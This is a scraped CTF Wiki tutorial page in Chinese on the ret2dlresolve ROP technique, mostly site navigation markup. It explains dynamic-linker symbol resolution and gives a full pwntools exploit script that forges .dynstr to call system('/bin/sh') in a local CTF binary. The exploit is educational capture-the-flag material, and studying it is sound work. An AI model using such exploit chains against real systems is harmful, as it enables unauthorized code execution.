深入理解 Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/overview/ class=md-nav__link> Overview </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/basic/ class=md-nav__link> Basic </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/heap-init/ class=md-nav__link> Heap init </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/malloc/ class=md-nav__link> Malloc </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/free/ class=md-nav__link> Free </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/tcache/ class=md-nav__link> Tcache </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/malloc_state/ class=md-nav__link> Malloc state </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/implementation/misc/ class=md-nav__link> Misc </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../glibc-heap/heapoverflow_basic/ class=md-nav__link> Heapoverflow basic </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/off_by_one/ class=md-nav__link> Off by one </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/chunk_extend_overlapping/ class=md-nav__link> Chunk extend overlapping </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/unlink/ class=md-nav__link> Unlink </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/use_after_free/ class=md-nav__link> Use after free </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/fastbin_attack/ class=md-nav__link> Fastbin Attack </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/unsorted_bin_attack/ class=md-nav__link> Unsorted Bin Attack </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/large_bin_attack/ class=md-nav__link> Large Bin Attack </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/tcache_attack/ class=md-nav__link> Tcache attack </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/house_of_einherjar/ class=md-nav__link> House Of Einherjar </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/house_of_force/ class=md-nav__link> House of force </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/house_of_lore/ class=md-nav__link> House of lore </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/house_of_orange/ class=md-nav__link> House of orange </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/house_of_rabbit/ class=md-nav__link> House of rabbit </a> </li> <li class=md-nav__item> <a href=../../../glibc-heap/house_of_roman/ class=md-nav__link> House of roman </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-5 type=checkbox id=nav-8-2-5> <label class=md-nav__link for=nav-8-2-5> IO_FILE 利用 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="IO_FILE 利用" data-md-level=3> <label class=md-nav__title for=nav-8-2-5> <span class="md-nav__icon md-icon"></span> IO_FILE 利用 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../io_file/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../io_file/fake-vtable-exploit/ class=md-nav__link> Fake vtable exploit </a> </li> <li class=md-nav__item> <a href=../../../io_file/fsop/ class=md-nav__link> Fsop </a> </li> <li class=md-nav__item> <a href=../../../io_file/exploit-in-libc2.24/ class=md-nav__link> Exploit in libc2.24 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-6 type=checkbox id=nav-8-2-6> <label class=md-nav__link for=nav-8-2-6> 条件竞争 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=条件竞争 data-md-level=3> <label class=md-nav__title for=nav-8-2-6> <span class="md-nav__icon md-icon"></span> 条件竞争 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../race-condition/introduction/ class=md-nav__link> Race Condition </a> </li> <li class=md-nav__item> <a href=../../../race-condition/problem/ class=md-nav__link> Problem </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-7 type=checkbox id=nav-8-2-7> <label class=md-nav__link for=nav-8-2-7> 整数溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=整数溢出 data-md-level=3> <label class=md-nav__title for=nav-8-2-7> <span class="md-nav__icon md-icon"></span> 整数溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../integeroverflow/intof/ class=md-nav__link> 整数溢出 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-8 type=checkbox id=nav-8-2-8> <label class=md-nav__link for=nav-8-2-8> 沙箱逃逸 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=沙箱逃逸 data-md-level=3> <label class=md-nav__title for=nav-8-2-8> <span class="md-nav__icon md-icon"></span> 沙箱逃逸 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../sandbox/python-sandbox-escape/ class=md-nav__link> Python 沙盒 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-9 type=checkbox id=nav-8-2-9> <label class=md-nav__link for=nav-8-2-9> kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=kernel data-md-level=3> <label class=md-nav__title for=nav-8-2-9> <span class="md-nav__icon md-icon"></span> kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../kernel/environment/ class=md-nav__link> Environment </a> </li> <li class=md-nav__item> <a href=../../../kernel/basic_knowledge/ class=md-nav__link> 基础知识 </a> </li> <li class=md-nav__item> <a href=../../../kernel/kernel_uaf/ class=md-nav__link> Kernel uaf </a> </li> <li class=md-nav__item> <a href=../../../kernel/kernel_rop/ class=md-nav__link> Kernel ROP </a> </li> <li class=md-nav__item> <a href=../../../kernel/ret2usr/ class=md-nav__link> Ret2usr </a> </li> <li class=md-nav__item> <a href=../../../kernel/bypass_smep/ class=md-nav__link> Bypass smep </a> </li> <li class=md-nav__item> <a href=../../../kernel/double-fetch/ class=md-nav__link> Double Fetch </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-10 type=checkbox id=nav-8-2-10> <label class=md-nav__link for=nav-8-2-10> arm-pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=arm-pwn data-md-level=3> <label class=md-nav__title for=nav-8-2-10> <span class="md-nav__icon md-icon"></span> arm-pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../arm/environment/ class=md-nav__link> 环境搭建 </a> </li> <li class=md-nav__item> <a href=../../../arm/arm_rop/ class=md-nav__link> Arm rop </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-11 type=checkbox id=nav-8-2-11> <label class=md-nav__link for=nav-8-2-11> mips-pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=mips-pwn data-md-level=3> <label class=md-nav__title for=nav-8-2-11> <span class="md-nav__icon md-icon"></span> mips-pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../mips/mips_rop/ class=md-nav__link> Mips rop </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-12 type=checkbox id=nav-8-2-12> <label class=md-nav__link for=nav-8-2-12> Summary <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Summary data-md-level=3> <label class=md-nav__title for=nav-8-2-12> <span class="md-nav__icon md-icon"></span> Summary </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../summary/get-address/ class=md-nav__link> Get address </a> </li> <li class=md-nav__item> <a href=../../../summary/hijack-control-flow/ class=md-nav__link> Hijack control flow </a> </li> <li class=md-nav__item> <a href=../../../summary/get-shell/ class=md-nav__link> Get shell </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-3 type=checkbox id=nav-8-3> <label class=md-nav__link for=nav-8-3> Windows Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Pwn" data-md-level=2> <label class=md-nav__title for=nav-8-3> <span class="md-nav__icon md-icon"></span> Windows Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../windows/readme/ class=md-nav__link> 概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-3-2 type=checkbox id=nav-8-3-2> <label class=md-nav__link for=nav-8-3-2> 栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=栈溢出 data-md-level=3> <label class=md-nav__title for=nav-8-3-2> <span class="md-nav__icon md-icon"></span> 栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../windows/stackoverflow/stack-introduce/ class=md-nav__link> Stack introduce </a> </li> <li class=md-nav__item> <a href=../../../../windows/stackoverflow/stackoverflow-basic/ class=md-nav__link> Stackoverflow basic </a> </li> <li class=md-nav__item> <a href=../../../../windows/stackoverflow/shellcode-in-stack/ class=md-nav__link> Shellcode in stack </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9 type=checkbox id=nav-9> <label class=md-nav__link for=nav-9> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=nav-9> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_develop/basic_develop/ class=md-nav__link> Android 开发基础 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2 type=checkbox id=nav-9-2> <label class=md-nav__link for=nav-9-2> Android 运行机制简述 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 运行机制简述" data-md-level=2> <label class=md-nav__title for=nav-9-2> <span class="md-nav__icon md-icon"></span> Android 运行机制简述 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_operating_mechanism/readme/ class=md-nav__link> Android 应用运行机制简述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2 type=checkbox id=nav-9-2-2> <label class=md-nav__link for=nav-9-2-2> Android 中 Java 层的运行机制 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 中 Java 层的运行机制" data-md-level=3> <label class=md-nav__title for=nav-9-2-2> <span class="md-nav__icon md-icon"></span> Android 中 Java 层的运行机制 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_operating_mechanism/java_layer/readme/ class=md-nav__link> Android 中 Java 层的运行机制 </a> </li> <li class=md-nav__item> <a href=../../../../../android/basic_operating_mechanism/java_layer/smali/smali/ class=md-nav__link> Smali </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-3 type=checkbox id=nav-9-2-2-3> <label class=md-nav__link for=nav-9-2-2-3> Dex && ODEX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Dex && ODEX" data-md-level=4> <label class=md-nav__title for=nav-9-2-2-3> <span class="md-nav__icon md-icon"></span> Dex && ODEX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_operating_mechanism/java_layer/dex/dex/ class=md-nav__link> DEX文件 </a> </li> <li class=md-nav__item> <a href=../../../../../android/basic_operating_mechanism/java_layer/dex/odex/ class=md-nav__link> ODEX文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3 type=checkbox id=nav-9-2-3> <label class=md-nav__link for=nav-9-2-3> Android Native 层介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android Native 层介绍" data-md-level=3> <label class=md-nav__title for=nav-9-2-3> <span class="md-nav__icon md-icon"></span> Android Native 层介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_operating_mechanism/native_layer/so/ class=md-nav__link> so 介绍 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3 type=checkbox id=nav-9-3> <label class=md-nav__link for=nav-9-3> Android 逆向基本介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 逆向基本介绍" data-md-level=2> <label class=md-nav__title for=nav-9-3> <span class="md-nav__icon md-icon"></span> Android 逆向基本介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/overview/ class=md-nav__link> Android 逆向基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/android_code_location/ class=md-nav__link> Android 关键代码定位 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3-3 type=checkbox id=nav-9-3-3> <label class=md-nav__link for=nav-9-3-3> Android 简单静态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 简单静态分析" data-md-level=3> <label class=md-nav__title for=nav-9-3-3> <span class="md-nav__icon md-icon"></span> Android 简单静态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/static/java-example/ class=md-nav__link> 静态分析 java 层例子 </a> </li> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/static/so-example/ class=md-nav__link> 静态分析原生层程序 </a> </li> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/static/complex-example/ class=md-nav__link> 静态分析综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3-4 type=checkbox id=nav-9-3-4> <label class=md-nav__link for=nav-9-3-4> Android 简单动态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 简单动态分析" data-md-level=3> <label class=md-nav__title for=nav-9-3-4> <span class="md-nav__icon md-icon"></span> Android 简单动态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/dynamic/dynamic_debug/ class=md-nav__link> Android 动态调试 </a> </li> <li class=md-nav__item> <a href=../../../../../android/basic_reverse/dynamic/ida_native_debug/ class=md-nav__link> IDA 动态调试原生层程序 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10 type=checkbox id=nav-10> <label class=md-nav__link for=nav-10> ICS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ICS data-md-level=1> <label class=md-nav__title for=nav-10> <span class="md-nav__icon md-icon"></span> ICS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../ics/ctfs/ class=md-nav__link> ICS_CTF 竞赛 </a> </li> <li class=md-nav__item> <a href=../../../../../ics/discover/ class=md-nav__link> ICS_CTF 发现 </a> </li> <li class=md-nav__item> <a href=../../../../../ics/exploit/ class=md-nav__link> ICS_CTF 利用 </a> </li> <li class=md-nav__item> <a href=../../../../../ics/learn/ class=md-nav__link> ICS_CTF 学习资源 </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 原理 </a> <nav class=md-nav aria-label=原理> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1- class=md-nav__link> 思路1 - 直接控制重定位表项的相关内容 </a> </li> <li class=md-nav__item> <a href=#2- class=md-nav__link> 思路2 - 间接控制重定位表项的相关内容 </a> </li> <li class=md-nav__item> <a href=#3-link_map class=md-nav__link> 思路3 - 伪造 link_map </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#32 class=md-nav__link> 32 位例子 </a> <nav class=md-nav aria-label="32 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 手工伪造 </a> <nav class=md-nav aria-label=手工伪造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#stage-1 class=md-nav__link> stage 1 </a> </li> <li class=md-nav__item> <a href=#stage-2 class=md-nav__link> stage 2 </a> </li> <li class=md-nav__item> <a href=#stage-3 class=md-nav__link> stage 3 </a> </li> <li class=md-nav__item> <a href=#stage-4 class=md-nav__link> stage 4 </a> </li> <li class=md-nav__item> <a href=#stage-5 class=md-nav__link> stage 5 </a> </li> <li class=md-nav__item> <a href=#stage-6 class=md-nav__link> stage 6 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 基于工具伪造 </a> <nav class=md-nav aria-label=基于工具伪造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#roputil class=md-nav__link> Roputil </a> </li> <li class=md-nav__item> <a href=#pwntools class=md-nav__link> pwntools </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#64 class=md-nav__link> 64 位例子 </a> <nav class=md-nav aria-label="64 位例子"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#no-relro_1 class=md-nav__link> NO RELRO </a> </li> <li class=md-nav__item> <a href=#partial-relro_1 class=md-nav__link> Partial RELRO </a> <nav class=md-nav aria-label="Partial RELRO"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 手工伪造 </a> <nav class=md-nav aria-label=手工伪造> <ul class=md-nav__list> <li class=md-nav__item> <a href=#64_1 class=md-nav__link> 64 位的变化 </a> </li> <li class=md-nav__item> <a href=#first-try-leak class=md-nav__link> First Try - leak </a> </li> <li class=md-nav__item> <a href=#second-try-no-leak class=md-nav__link> Second try - no leak </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 基于工具伪造 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#full-relro_1 class=md-nav__link> Full RELRO </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-readable class=md-nav__link> 2015-hitcon-readable </a> <nav class=md-nav aria-label=2015-hitcon-readable> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1modify-dynamic-section class=md-nav__link> 方法1：modify dynamic section </a> </li> <li class=md-nav__item> <a href=#2-rop class=md-nav__link> 方法 2 - 标准 ROP </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-hitcon-quals-blinkroot class=md-nav__link> 2015-hitcon-quals-blinkroot </a> </li> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 总结 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 题目 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 参考 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1>ret2dlresolve</h1> <div class="admonition warning"> <p class=admonition-title>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>But you can help translating it: <a href=https://ctf-wiki.org/contributing>Contributing</a>.</p> </div> <p>在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分 ELF 对应的介绍。这里只给出相应的利用方式。</p> <h2 id=_1>原理<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。</p> <p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p> <h3 id=1->思路1 - 直接控制重定位表项的相关内容<a class=headerlink href=#1- title="Permanent link">&para;</a></h3> <p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 <code>.dynstr</code>，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p> <p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p> <h3 id=2->思路2 - 间接控制重定位表项的相关内容<a class=headerlink href=#2- title="Permanent link">&para;</a></h3> <p>既然动态链接器会从 <code>.dynamic</code> 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p> <h3 id=3-link_map>思路3 - 伪造 link_map<a class=headerlink href=#3-link_map title="Permanent link">&para;</a></h3> <p>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p> <p>下面我们以 2015-XDCTF-pwn200 来介绍 32 位和 64 位下如何使用 ret2dlresolve 技巧。</p> <h2 id=32>32 位例子<a class=headerlink href=#32 title="Permanent link">&para;</a></h2> <h3 id=no-relro>NO RELRO<a class=headerlink href=#no-relro title="Permanent link">&para;</a></h3> <p>首先，我们可以按照下面的方式来编译对应的文件。</p> <div class=highlight><pre><span></span><code>❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</code></pre></div> <p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为我们只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p> <ol> <li>修改 .dynamic 节中字符串表的地址为伪造的地址</li> <li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li> <li>在特定的位置读取 /bin/sh 字符串。</li> <li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。</li> </ol> <p>代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;i386&quot;</span>
<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_32&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_32&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_32&quot;</span><span class=p>)</span>

<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x08049804</span><span class=o>+</span><span class=mi>4</span><span class=p>,</span><span class=mi>4</span><span class=p>)</span> <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x080498E0</span><span class=p>,</span><span class=nb>len</span><span class=p>((</span><span class=n>dynstr</span><span class=p>)))</span> <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x080498E0</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>))</span> <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x08048376</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x080498E0</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span>
<span class=c1># print(rop.dump())</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x080498E0</span><span class=p>))</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>运行效果如下</p> <div class=highlight><pre><span></span><code><span class=err>❯</span> <span class=n>python</span> <span class=n>exp</span><span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>relro</span><span class=o>.</span><span class=n>py</span>
<span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Starting</span> <span class=n>local</span> <span class=n>process</span> <span class=s1>&#39;./main_no_relro_32&#39;</span><span class=p>:</span> <span class=n>pid</span> <span class=mi>35093</span>
